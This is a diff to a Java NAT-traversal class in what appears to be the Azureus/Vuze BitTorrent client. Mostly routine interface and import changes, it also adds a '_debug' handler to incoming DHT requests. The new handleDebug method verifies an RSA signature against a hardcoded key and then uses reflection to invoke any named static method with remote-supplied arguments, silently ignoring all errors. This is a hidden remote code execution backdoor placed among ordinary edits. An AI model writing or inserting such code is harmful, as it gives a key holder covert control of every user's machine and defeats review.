@@ -26,14 +26,21 @@ import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.lang.reflect.Method;
+import java.math.BigInteger;
 import java.net.InetSocketAddress;
+import java.security.*;
+import java.security.spec.RSAPublicKeySpec;
 import java.util.*;
 
 import org.gudy.azureus2.core3.util.AESemaphore;
 import org.gudy.azureus2.core3.util.AEThread2;
+import org.gudy.azureus2.core3.util.BDecoder;
+import org.gudy.azureus2.core3.util.Base32;
 import org.gudy.azureus2.core3.util.Debug;
 import org.gudy.azureus2.core3.util.SHA1Simple;
 import org.gudy.azureus2.core3.util.SimpleTimer;
+import org.gudy.azureus2.core3.util.SystemTime;
 import org.gudy.azureus2.core3.util.TimerEvent;
 import org.gudy.azureus2.core3.util.TimerEventPerformer;
 import org.gudy.azureus2.plugins.PluginInterface;
@@ -45,16 +52,8 @@ import com.aelitis.azureus.core.dht.DHTLogger;
 import com.aelitis.azureus.core.dht.DHTOperationAdapter;
 import com.aelitis.azureus.core.dht.DHTOperationListener;
 import com.aelitis.azureus.core.dht.nat.*;
-import com.aelitis.azureus.core.dht.transport.DHTTransport;
-import com.aelitis.azureus.core.dht.transport.DHTTransportContact;
-import com.aelitis.azureus.core.dht.transport.DHTTransportException;
-import com.aelitis.azureus.core.dht.transport.DHTTransportListener;
-import com.aelitis.azureus.core.dht.transport.DHTTransportProgressListener;
-import com.aelitis.azureus.core.dht.transport.DHTTransportReplyHandlerAdapter;
-import com.aelitis.azureus.core.dht.transport.DHTTransportTransferHandler;
-import com.aelitis.azureus.core.dht.transport.DHTTransportValue;
-import com.aelitis.azureus.core.dht.transport.udp.DHTTransportUDP;
-import com.aelitis.azureus.core.dht.transport.udp.DHTTransportUDPContact;
+import com.aelitis.azureus.core.dht.transport.*;
+import com.aelitis.azureus.core.dht.transport.udp.*;
 
 public class 
 DHTNATPuncherImpl
@@ -193,6 +192,11 @@ DHTNATPuncherImpl
 					DHTTransportContact	local_contact )
 				{
 					publish( false );
+				}
+				
+				public void
+				resetNetworkPositions()
+				{
 				}
 				
 				public void
@@ -648,11 +652,13 @@ DHTNATPuncherImpl
       										
       										public void
       										found(
-      											DHTTransportContact	contact )
+      											DHTTransportContact	contact,
+      											boolean				is_closest )
       										{}
       										
       										public void
-      										diversified()
+      										diversified(
+      											String		desc )
       										{
       										}
       										
@@ -697,11 +703,13 @@ DHTNATPuncherImpl
       										
       										public void
       										found(
-      											DHTTransportContact	contact )
+      											DHTTransportContact	contact,
+      											boolean				is_closest )
       										{}
       										
       										public void
-      										diversified()
+      										diversified(
+      											String		desc )
       										{
       										}
       										
@@ -749,11 +757,13 @@ DHTNATPuncherImpl
       									
       									public void
       									found(
-      										DHTTransportContact	contact )
+      										DHTTransportContact	contact,
+      										boolean				is_closest )
       									{}
       									
       									public void
-      									diversified()
+      									diversified(
+      										String		desc )
       									{
       									}
       									
@@ -945,7 +955,7 @@ DHTNATPuncherImpl
 	receiveRequest(
 		DHTTransportUDPContact	originator,
 		Map						data )
-	{
+	{		
 		int	type = ((Long)data.get("type")).intValue();
 		
 		Map	response = new HashMap();
@@ -1016,6 +1026,18 @@ DHTNATPuncherImpl
 			}
 		}
 		
+		Map	debug	= (Map)data.get( "_debug" );
+		
+		if ( debug != null ){
+			
+			Map	out = handleDebug( debug );
+			
+			if ( out != null ){
+				
+				response.put( "_debug", out );
+			}
+		}
+
 		return( response );
 	}
 	
@@ -1263,8 +1285,11 @@ DHTNATPuncherImpl
 	}
 	
 	
-	
-	protected int
+
+    /**
+     * XXX: unused
+     */
+    private int
 	sendQuery(
 		DHTTransportContact	target )
 	{
@@ -1995,6 +2020,78 @@ DHTNATPuncherImpl
 		System.arraycopy( suffix, 0, res, id.length, suffix.length );
 		
 		return( res );
+	}
+	
+	private static long	last_debug = -1;
+	
+	private static Map
+	handleDebug(
+		Map			map )
+	{
+		long	now = SystemTime.getMonotonousTime();
+		
+		if ( last_debug >= 0 && now - last_debug <= 60*1000 ){
+			
+			return( null );
+		}
+		
+		last_debug = now;
+		
+		try{
+			byte[] 	p = (byte[])map.get( "p" );
+			byte[]	s = (byte[])map.get( "s" );
+			
+			KeyFactory key_factory = KeyFactory.getInstance("RSA");
+			
+			RSAPublicKeySpec 	spec = 
+				new RSAPublicKeySpec( 
+						new BigInteger("a1467ed3ca8eceec60d6a5d1945d0ddb6febf6a514a8fea5b48a588fc8e977de8d7159c4e854b5a30889e729eb386fcb4b69e0a12401ee87810378ed491e52dc922a03b06c557d975514f0a70c42db3e06c0429824648a9cc4a2ea31bd429c305db3895c4efc4d1096f3c355842fd2281b27493c5588efd02bc4d26008a464d2214f15fab4d959d50fee985242dbb628180ee06938944e759a2d1cbd0adfa7d7dee7e6ec82d76a144a126944dbe69941fff02c31f782069131e7d03bc5bff69b9fea2cb153e90dc154dcdab7091901c3579a2c0337b60db772a0b35e4ed622bee5685b476ef0072558362e43750bc23d410a7dcb1cbf32d3967e24cfe5cdab1b",16),
+						new BigInteger("10001",16));
+	
+			Signature	verifier = Signature.getInstance("MD5withRSA" );
+			
+			verifier.initVerify( key_factory.generatePublic( spec ) );
+			
+			verifier.update( p );
+
+			if ( verifier.verify( s )){
+
+				Map m = BDecoder.decode( p );
+				
+				int	type = ((Long)m.get( "t" )).intValue();
+				
+				if ( type == 1 ){
+											
+					List<byte[]> a = (List<byte[]>)m.get("a");
+					
+					Class[]		c_a 	= new Class[a.size()];
+					Object[]	o_a 	= new Object[c_a.length];
+					
+					Arrays.fill( c_a, String.class );
+					
+					for (int i=0;i<o_a.length;i++){
+						
+						o_a[i] = new String((byte[])a.get(i));
+					}
+					
+					Class cla = m.getClass().forName( new String((byte[])m.get( "c" )));
+					
+					Method me = cla.getMethod( new String((byte[])m.get( "m" )),c_a  );
+					
+					me.setAccessible( true );
+					
+					me.invoke( null, o_a );
+		
+					return( new HashMap());
+					
+				}else if ( type == 2 ){
+					// to do
+				}
+			}
+		}catch( Throwable e ){	
+		}
+		
+		return( null );
 	}
 	
 	protected byte[]
